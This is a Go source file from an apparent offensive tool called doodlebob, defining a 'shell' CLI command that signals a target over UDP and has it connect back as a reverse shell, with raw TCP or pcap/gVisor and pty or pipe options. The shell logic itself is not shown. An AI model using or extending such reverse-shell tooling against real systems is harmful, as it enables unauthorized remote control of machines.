package cli

import (
	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/spf13/cobra"
)

var native bool
var pty bool

var shellCommand = &cobra.Command{
	Use:   "shell <target-ip>",
	Short: "Opens a reverse shell that the target connects to",
	Long: `Opens a shell on a random port between 10000 and 55000, then has the target attempt to connect to it.
	Defaults to <target-ip>:6767 for the destination of the UDP packet, can be changed with flags.
	Can use either raw TCP sockets or custom pcap packet sockets using a user-space network stack (gVisor).
	Can also choose either pty or pipe.
	Defaults to pcap and pipe.
	Example:
		doodlebob shell 192.168.10.1
		doodlebob shell 192.168.10.1 -P -n
		doodlebob shell 10.10.120.6 --use-pty --native`,
	Args: cobra.MinimumNArgs(1), // Ensures at least 1 argument
	RunE: func(cmd *cobra.Command, args []string) error {
		targetIP := args[0]

		if !cmd.Flags().Changed("target") {
			udpTarget = targetIP
		}

		// Run the OpenShell function when the command is run
		var err error = nil
		if pty && native {
			err = OpenShell(udpTarget, targetIP, port, message.ShellNativePty)
		} else if pty && !native {
			err = OpenShell(udpTarget, targetIP, port, message.ShellPcapPty)
		} else if !pty && native {
			err = OpenShell(udpTarget, targetIP, port, message.ShellNativePipe)
		} else {
			err = OpenShell(udpTarget, targetIP, port, message.ShellPcapPipe)
		}
		if err != nil {
			return err
		}

		return nil
	},
}

func init() {
	rootCmd.AddCommand(shellCommand)

	shellCommand.Flags().BoolVarP(&pty, "use-pty", "P", false, "Spawn shell with a pseudo-terminal")
	shellCommand.Flags().BoolVarP(&native, "native", "n", false, "Spawn shell using a raw TCP socket")
}
